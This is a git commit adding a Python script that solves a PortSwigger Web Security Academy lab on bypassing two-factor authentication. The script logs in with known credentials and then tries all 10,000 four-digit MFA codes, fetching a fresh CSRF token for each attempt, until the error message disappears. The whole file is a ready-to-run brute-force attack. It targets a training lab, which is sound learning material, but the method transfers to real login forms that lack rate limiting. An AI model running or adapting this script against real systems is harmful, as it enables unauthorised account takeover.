686fc1db2881ba71efd0adc2f826615c934c693d
Wiiz4rD <95846812+Wiiz4rD@users.noreply.github.com>
2021-12-15 20:54:06 +0300

    Lab: 2FA bypass using a brute-force attack
    Solve faster without Burp Pro

---
+++ 2FA_bypass_auth_brute/bypass_2fa_auth.py
@@ -0,0 +1,43 @@
+import sys
+import requests
+from bs4 import BeautifulSoup
+
+
+# Portswigger Lab: 2FA bypass using a brute-force attack
+# Solve faster without burpsuite pro.
+# Change target_url and target_2fa to your lab url!
+
+def get_csrf_token(_response):
+    soup = BeautifulSoup(response.text, 'html.parser')
+    return soup.select_one('[name="csrf"]')['value']
+
+
+target_url = "https://ac431f921fe23a25c06008c000cc00c2.web-security-academy.net/login"  # Change this
+target_2fa = "https://ac431f921fe23a25c06008c000cc00c2.web-security-academy.net/login2"  # Change this
+username = "carlos"
+password = "montoya"
+
+session = requests.Session()
+
+for code in range(10000):
+    response = session.get(target_url)
+    csrf_token = get_csrf_token(response)
+    post_data = "username=" + username + "&password=" + password + "&csrf=" + csrf_token
+    session.post(target_url, data=post_data)
+
+    response = session.get(target_2fa)
+    csrf_token = get_csrf_token(response)
+
+    num = "0" * (4 - len(str(code))) + str(code)
+    post_2fa = "mfa-code=" + num + "&csrf=" + csrf_token
+    print("Try " + num)
+    response = session.post(target_2fa, data=post_2fa)
+
+    if "Incorrect security code" not in response.content.decode():
+        print("FOUND 2FA CODE " + num)
+        print("Response code ", response.status_code)
+        print(response.content.decode())
+        sys.exit(0)
+    if response.status_code != 200:
+        print("Error response status: ", response.status_code)
+        sys.exit(0)
